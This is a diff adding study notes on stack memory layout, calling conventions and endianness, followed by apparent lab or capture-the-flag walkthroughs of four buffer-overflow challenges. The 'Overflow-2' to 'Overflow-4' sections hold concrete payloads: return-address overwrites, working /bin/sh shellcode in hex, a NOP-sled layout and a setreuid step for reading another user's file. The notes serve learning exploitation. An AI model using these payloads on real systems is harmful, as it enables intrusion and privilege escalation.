@@ -1,0 +1,133 @@
+------------------
+NOTES
+------------------
+Programs are run as a process on, a computer does not run each process concurrently
+	switches between each process quickly
+
+------------------------
+| 		User Stack 				|
+------------------------
+|          							|
+------------------------
+| 		Library regions 	|
+------------------------
+|          							|
+------------------------
+|    Run time heap 		 	|
+------------------------
+|    Read write data 	  |
+------------------------
+|    Read only code			|
+------------------------
+|          							|
+------------------------
+
+Stack
+	stores information about functions such as program counter and saved registers
+	grows downward
+		pushing - used to add data onto the stack
+		popping - used to remove data from the stack
+
+		push var
+			decrements the stack pointer by 8 (rsp - 0x08)
+			write abouce the value to new location of rsp
+		pop var
+			increment the stack pointer by 8 (rsp + 0x08)
+			stores the value that was read from rsp into var
+			!! memory does not change when popping only the stack pointer does !!
+
+	each function in a program has its own stack frame
+
+
+Heap
+	Dynamically allocated memory
+
+
+Processes
+	call operand in asm
+		can either take a function name or a memory address as an offset to the location of the start fo the function
+		once a function is called a program needs to know how what to do after it completes:
+			pushes the address of the next instruction (from caller func) onto the stack
+			allocates a stack frame for the new function
+			changes the current instruction pointer to the first instruction in the function
+			changes the stack pointer to the top of the stack
+			chagnes the frame pointer to the start of the new frame
+
+Storing arguments
+	the caller stores up to 6 arguments in registers
+		rdi, rsi, rdx, rcx, r8, r9
+		* rax is the return address pointer
+	if the callee wants to store values in registers:
+		originally stores values on their stack frame which are then loaded into the registers
+
+Endianess
+	Computers understand binary -> represented by hexadecimal
+	example:
+		0x12345678
+		least significant bye is right most (78)
+		most significant byte is left most (12)
+		little endian arranges values from the least significant to most significant
+			78 56 34 12
+		Big endian goes MSB - LSB
+			12 34 56 78
+
+Overflow-1
+	Overwriting varaibles
+		Stack is laid out chronologically, therefore it is plausible that two variables
+		declared after eachother would be next to eachother on the stack
+	 boundaries are aligned to a specific size (either 8 or 16 bytes)
+	 	a 12 byte array would get padding added to become 16 bytes
+
+Overflow-2
+	set a breakpoint before new_ptr()
+	find the address of special()
+	need to find length to overwrite the return address
+	basically doing it A by A, find that 20 is the sweet spot
+	have 6 bytes to work with, end payload is AAAAAAAAAAAAAAUQUUUU
+	UQUUUU is \x55\x51\x55\x55\x55\x55 in ascii
+	\x55\x51\x55\x55\x55\x55 is the address of the special function
+
+Overflow-3
+	length of 158
+	offset calculated manually
+		manually added A's to find the return address
+	Needed shellcode used this for /bin/sh
+		\x6a\x3b\x58\x48\x31\xd2\x49\xb8\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x49\xc1\xe8\x08\x41\x50\x48\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05\x6a\x3c\x58\x48\x31\xff\x0f\x05
+		Shell code is 40 bytes long
+	Payload ends up needing to be JUNK (NOPs) (100 Bytes) + SHELLCODE (40 Bytes) + JUNK (12 Bytes) + RET ADDR (6 BYTES)
+		no specific reason for the split of 100/12 for the junk, just needs to be 112
+	Calculate offset from the start of buffer to shellcode:
+		filling the JUNK with a bunch of A's gives recognizable hex
+		check the hex code with x/100x $rsp-200 to find where the A's vs the shellcode are
+
+		Example:
+			0x7fffffffe288:	0x41414141	0x41414141	0x41414141	0x41414141
+			0x7fffffffe2a8:	0x41414141	0x41414141	0x41414141	0x48583b6a <--- start of the shellcode
+
+			Start of shellcode is in the 4th column of 0x7fffffffe2a8, therefore the real address is 0x7fffffffe2a8 + 4 * 3 (4 bytes per column)
+
+		To give resistance to exploit, add NOPs in for junk to broaden range, then, we dont have to jump to the exact address we can jump to anywhere in the NOPs
+
+		Problem: weird nops -> use python2
+			NOPs are showing up as 0x90c290c2???
+			the way python3 deal with raw bytes is messy, best to use py2 when making exploit scripts
+
+		This will drop a shell :)
+			but the user is still user1, need to change the UID to user2 who can read the secret.txt file
+
+		Modifying the shellcode :0
+			using pwntools can get shellcode to set the uid to 1002
+				pwn shellcraft -f d amd64.linux.setreuid 1002
+			add this to the beginning of the shellcode in the payload and decrease the NOP sled by 14 bytes (amount of the uid shellcode)
+			and exploit should run :)
+
+
+Overflow - 4
+	OFFSET IS 169 LETS GOOOOOOO
+	only difference is the owner of the file is user3, not user2 and the offset is 169
+
+	Automatically calc the offset!!
+		use metasploit -> /usr/share/metasploit-framework/tools/exploit/pattern-create.rb -l 200
+		find the pattern that is sent in gdb
+		/usr/share/metasploit-framework/tools/exploit/pattern-offset.rb -l 200 -q (whatever is in rbp)
+		gives like 161 or something, rbp is 8 bytes therefore total offset is 169 :)
